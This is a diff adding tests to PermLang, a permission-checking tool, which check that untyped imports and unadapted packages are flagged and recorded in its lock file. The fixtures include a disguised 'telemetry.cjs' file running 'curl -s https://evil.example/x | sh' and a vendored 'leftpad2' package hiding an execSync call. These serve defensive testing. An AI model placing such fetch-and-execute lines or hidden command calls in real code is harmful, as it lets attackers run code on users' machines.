@@ -631,3 +631,67 @@ describe("a default import TypeScript gives no type (module commonjs, no esModul
     for (const harmless of ["src/constant.ts", "src/pure.ts", "src/typed.ts"]) expect(reaches(harmless)).toEqual({});
   });
 });
+
+describe("new code PermLang can't check is recorded in the lock", () => {
+  const vendored = () => {
+    write("src/node_modules/leftpad2/package.json", JSON.stringify({ name: "leftpad2", version: "1.0.0", main: "index.js", types: "index.d.ts" }));
+    write("src/node_modules/leftpad2/index.d.ts", "export declare function pad(s: string): string;\n");
+    write("src/node_modules/leftpad2/index.js", 'const { execSync } = require("node:child_process");\nexports.pad = function (s) { execSync("id"); return s; };\n');
+  };
+  const pr = () => {
+    write("src/telemetry.cjs", 'require("node:child_process").execSync("curl -s https://evil.example/x | sh");\n');
+    vendored();
+    write("src/more.ts", 'import "./telemetry.cjs";\nimport { pad } from "leftpad2";\nexport function usePad() {\n  return pad("x");\n}\n');
+  };
+
+  it("fails on a new import with no types and a new package with no adapter, and lists them in the comment", () => {
+    expect(permlang("init", "src").code).toBe(0);
+    commit("base");
+    pr();
+
+    const check = permlang("check", "src");
+    expect(check.code).toBe(1);
+    // The warnings stay as they were.
+    expect(check.out).toContain("src/more.ts:1:1 warning PERM007: imports ./telemetry.cjs, whose types can't be found");
+    expect(check.out).toContain("warning PERM006: usePad calls into leftpad2");
+    expect(check.out).toContain("-> convert it to TypeScript, so PermLang can check it.");
+    expect(check.out).toContain("src/more.ts:1:1 error PERM005: PermLang can't check src/telemetry.cjs: its types can't be found, and permlang.lock.json doesn't record it.");
+    expect(check.out).toContain("src/more.ts:4:1 error PERM005: PermLang can't check leftpad2: it has no adapter, and permlang.lock.json doesn't record it.");
+
+    const md = permlang("diff", "HEAD", "src", "--format", "markdown").out;
+    expect(md).toContain("**New code PermLang can't check**");
+    expect(md).toContain("- <code>+ src/telemetry.cjs</code>: an import with no types, in src/more.ts:\u{200b}1");
+    expect(md).toContain("- <code>+ leftpad2</code>: a package with no adapter, called in src/more.ts:\u{200b}4");
+    expect(md).not.toContain("No permission changes");
+    expect(md).not.toContain("gain access");
+    expect(permlang("diff", "HEAD", "src").out).toContain("New code PermLang can't check:\n  + src/telemetry.cjs: an import with no types, in src/more.ts:1\n  + leftpad2: a package with no adapter, called in src/more.ts:4");
+
+    expect(permlang("lock", "src").code).toBe(0);
+    expect(lockJson().functions["permlang.config.json#<unchecked>"]).toEqual(["unchecked.import(src/telemetry.cjs)", "unchecked.package(leftpad2)"]);
+    expect(permlang("check", "src").code).toBe(0);
+  });
+
+  it("records them whatever the unmapped policy, and fails when the code stops using one", () => {
+    write("permlang.config.json", JSON.stringify({ strictness: "sketch", unmapped: "trust" }));
+    pr();
+    expect(permlang("lock", "src").code).toBe(0);
+    expect(lockJson().functions["permlang.config.json#<unchecked>"]).toHaveLength(2);
+    write("src/more.ts", 'import { pad } from "leftpad2";\nexport function usePad() {\n  return pad("x");\n}\n');
+    const check = permlang("check", "src");
+    expect(check.code).toBe(1);
+    const line = read("permlang.lock.json").split("\n").findIndex((l) => l.includes('"unchecked.import(src/telemetry.cjs)"')) + 1;
+    expect(check.out).toContain(`permlang.lock.json:${line}:1 error PERM005: permlang.lock.json records src/telemetry.cjs as code PermLang can't check, which the code no longer imports.`);
+  });
+
+  it("tells apart files of the same name imported from different folders", () => {
+    write("src/a/x.cjs", "module.exports = 1;\n");
+    write("src/a/use.ts", 'import "./x.cjs";\nexport const a = 1;\n');
+    expect(permlang("lock", "src", "--strictness", "sketch").code).toBe(0);
+    write("src/b/x.cjs", 'require("node:child_process").execSync("id");\n');
+    write("src/b/use.ts", 'import "./x.cjs";\nexport const b = 1;\n');
+    const check = permlang("check", "src", "--strictness", "sketch");
+    expect(check.code).toBe(1);
+    expect(check.out).toContain("src/b/use.ts:1:1 warning PERM007: imports ./x.cjs");
+    expect(check.out).toContain("PermLang can't check src/b/x.cjs: its types can't be found, and permlang.lock.json doesn't record it.");
+  });
+});
